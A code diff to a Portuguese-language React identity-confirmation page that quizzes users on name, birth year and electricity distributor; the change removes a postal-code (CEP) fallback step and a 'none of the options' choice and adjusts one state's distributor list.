@@ -1,9 +1,8 @@
-import React, { useState, useEffect } from "react";
+import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
 import { Button } from "@/components/ui/button";
-import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
+import { Form, FormControl, FormField, FormItem, FormMessage } from "@/components/ui/form";
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
-import { Input } from "@/components/ui/input";
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
@@ -13,7 +12,7 @@ import { zodResolver } from "@hookform/resolvers/zod";
 import Header from "@/components/Header";
 import Footer from "@/components/Footer";
 import { useQueryClient } from "@tanstack/react-query";
-import { ArrowRight, Loader2, Search as SearchIcon } from "lucide-react";
+import { ArrowRight, Loader2 } from "lucide-react";
 import { apiRequest } from "@/lib/queryClient";
 import { useLocalizacao } from "@/components/LocalizacaoDetector";
 import { useUserData } from "../contexts/UserContext";
@@ -22,7 +21,6 @@ enum EtapaVerificacao {
   NOME = 0,
   ANO_NASCIMENTO = 1,
   COMPANHIA_ELETRICA = 2,
-  CEP_ALTERNATIVO = 3,
 }
 
 // Definir o esquema de validação para o formulário
@@ -38,17 +36,9 @@ const companhiaSchema = z.object({
   companhia: z.string().min(1, "Selecione uma opção"),
 });
 
-const cepSchema = z.object({
-  cep: z.string()
-    .min(8, "CEP deve ter pelo menos 8 dígitos")
-    .max(9, "CEP não deve ter mais de 9 caracteres")
-    .regex(/^\d{5}-?\d{3}$/, "CEP deve estar no formato 12345-678 ou 12345678"),
-});
-
 type NomeFormValues = z.infer<typeof nomeSchema>;
 type AnoFormValues = z.infer<typeof anoSchema>;
 type CompanhiaFormValues = z.infer<typeof companhiaSchema>;
-type CepFormValues = z.infer<typeof cepSchema>;
 
 // Lista de companhias elétricas por estado (atualizada para 2025)
 const companhiasEletricas: Record<string, string[]> = {
@@ -112,7 +102,7 @@ const opcoesCompanhiaPorEstado: Record<string, string[]> = {
   "Maranhão": ["Equatorial Maranhão", "Enel Distribuição Rio", "Neoenergia Cosern"],
   "Mato Grosso": ["Energisa Mato Grosso", "Neoenergia Coelba", "CPFL Piratininga"],
   "Mato Grosso do Sul": ["Energisa Mato Grosso do Sul", "Equatorial Maranhão", "EDP Espírito Santo"],
-  "Paraíba": ["Energisa Paraíba", "Neoenergia Pernambuco", "Equatorial Alagoas"],
+  "Paraíba": ["Energisa Paraíba", "Equatorial Goiás", "CPFL Paulista"],
   "Paraná": ["Copel Distribuição", "Neoenergia Coelba", "Amazonas Energia"],
   "Pernambuco": ["Neoenergia Pernambuco", "Energisa Mato Grosso", "EDP São Paulo"],
   "Piauí": ["Equatorial Piauí", "CELESC Distribuição", "Neoenergia Brasília"],
@@ -186,14 +176,6 @@ export default function ConfirmarIdentidade() {
     resolver: zodResolver(companhiaSchema),
     defaultValues: {
       companhia: "",
-    },
-  });
-  
-  // Formulário para input de CEP
-  const cepForm = useForm<CepFormValues>({
-    resolver: zodResolver(cepSchema),
-    defaultValues: {
-      cep: "",
     },
   });
 
@@ -548,74 +530,9 @@ export default function ConfirmarIdentidade() {
     }
   };
   
-  // Lidar com o envio do formulário de CEP
-  const onSubmitCep = async (values: CepFormValues) => {
-    try {
-      setIsLoading(true);
-      
-      // Formatar o CEP para remover qualquer caractere não numérico
-      const cepFormatado = values.cep.replace(/\D/g, '');
-      
-      // Consultar a API de CEP
-      const response = await fetch(`/api/consulta-cep?cep=${cepFormatado}`);
-      
-      if (!response.ok) {
-        const errorData = await response.json();
-        throw new Error(errorData.message || "Erro ao consultar o CEP");
-      }
-      
-      const data = await response.json();
-      
-      if (!data.success) {
-        throw new Error(data.message || "CEP não encontrado");
-      }
-      
-      // Obter o estado do CEP e gerar as opções de companhia
-      const estadoDoCep = data.estado;
-      console.log(`Estado detectado pelo CEP: ${estadoDoCep}`);
-      
-      // Atualizar o estado selecionado
-      setEstado(estadoDoCep);
-      
-      // Verificar se temos opções de companhia para o estado
-      if (!opcoesCompanhiaPorEstado[estadoDoCep]) {
-        throw new Error(`Não foram encontradas companhias elétricas para o estado ${estadoDoCep}`);
-      }
-      
-      // Gerar as opções de companhia com base no estado do CEP
-      gerarOpcoesCompanhia(estadoDoCep);
-      
-      // Voltar para a etapa de seleção de companhia
-      setEtapaAtual(EtapaVerificacao.COMPANHIA_ELETRICA);
-      
-      toast({
-        title: "CEP localizado",
-        description: `Estado identificado: ${estadoDoCep}. Por favor, selecione sua companhia elétrica.`,
-      });
-      
-    } catch (error: any) {
-      console.error("Erro ao consultar CEP:", error);
-      toast({
-        title: "Erro ao consultar CEP",
-        description: error.message || "Não foi possível localizar o CEP informado. Verifique e tente novamente.",
-        variant: "destructive",
-      });
-    } finally {
-      setIsLoading(false);
-    }
-  };
-  
   // Lidar com o envio do formulário de companhia elétrica
   const onSubmitCompanhia = (values: CompanhiaFormValues) => {
     const companhiaEscolhida = values.companhia;
-    
-    // Verificar se o usuário selecionou "Nenhuma das opções"
-    if (companhiaEscolhida === "nenhuma_das_opcoes") {
-      // Avançar para etapa de CEP
-      setEtapaAtual(EtapaVerificacao.CEP_ALTERNATIVO);
-      return;
-    }
-    
     let companhiaValida = false;
     
     // Regras específicas para cada estado com base na documentação atualizada
@@ -821,78 +738,6 @@ export default function ConfirmarIdentidade() {
                     </div>
                   )}
                   
-                  {etapaAtual === EtapaVerificacao.CEP_ALTERNATIVO && (
-                    <div>
-                      <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4">
-                        Por favor, informe seu CEP para identificarmos sua região:
-                      </h2>
-                      
-                      <Form {...cepForm}>
-                        <form onSubmit={cepForm.handleSubmit(onSubmitCep)} className="space-y-4">
-                          <FormField
-                            control={cepForm.control}
-                            name="cep"
-                            render={({ field }) => (
-                              <FormItem>
-                                <FormLabel>CEP</FormLabel>
-                                <FormControl>
-                                  <Input 
-                                    placeholder="Digite seu CEP (ex: 12345-678)" 
-                                    {...field} 
-                                    className="h-12"
-                                    maxLength={9}
-                                    onChange={(e: React.ChangeEvent<HTMLInputElement>) => {
-                                      // Formatar o CEP automaticamente (12345-678)
-                                      let value = e.target.value.replace(/\D/g, '');
-                                      if (value.length > 5) {
-                                        value = value.substring(0, 5) + '-' + value.substring(5);
-                                      }
-                                      field.onChange(value);
-                                    }}
-                                  />
-                                </FormControl>
-                                <FormDescription>
-                                  Informe o CEP completo com 8 dígitos.
-                                </FormDescription>
-                                <FormMessage />
-                              </FormItem>
-                            )}
-                          />
-                          
-                          <div className="text-center mt-6">
-                            <Button 
-                              type="submit"
-                              className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
-                              disabled={isLoading || !cepForm.watch("cep") || cepForm.watch("cep").length < 8}
-                            >
-                              {isLoading ? (
-                                <>
-                                  <span>Consultando CEP...</span>
-                                  <Loader2 className="ml-2 h-5 w-5 animate-spin" />
-                                </>
-                              ) : (
-                                <>
-                                  <span>Consultar CEP</span>
-                                  <SearchIcon className="ml-2 h-5 w-5" />
-                                </>
-                              )}
-                            </Button>
-                            
-                            <Button 
-                              type="button"
-                              variant="outline"
-                              className="mt-3 w-full py-3"
-                              onClick={() => setEtapaAtual(EtapaVerificacao.COMPANHIA_ELETRICA)}
-                              disabled={isLoading}
-                            >
-                              Voltar para a seleção de companhia
-                            </Button>
-                          </div>
-                        </form>
-                      </Form>
-                    </div>
-                  )}
-                  
                   {etapaAtual === EtapaVerificacao.COMPANHIA_ELETRICA && (
                     <div>
                       <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4">
@@ -920,12 +765,6 @@ export default function ConfirmarIdentidade() {
                                         </Label>
                                       </div>
                                     ))}
-                                    <div className="flex items-center space-x-2 border p-3 rounded-md">
-                                      <RadioGroupItem value="nenhuma_das_opcoes" id="companhia-nenhuma" />
-                                      <Label htmlFor="companhia-nenhuma" className="flex-1 cursor-pointer">
-                                        Nenhuma das opções
-                                      </Label>
-                                    </div>
                                   </RadioGroup>
                                 </FormControl>
                                 <FormMessage />
